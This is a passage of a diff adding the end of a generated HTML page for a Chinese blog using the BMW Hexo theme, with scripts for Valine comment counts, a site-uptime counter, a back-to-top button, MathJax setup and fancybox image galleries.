+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw" target="_blank" rel="noopener">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/" target="_blank" rel="noopener">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2020, 5, 8).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+
+
+
+  </body>
+  
+  
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+</html>
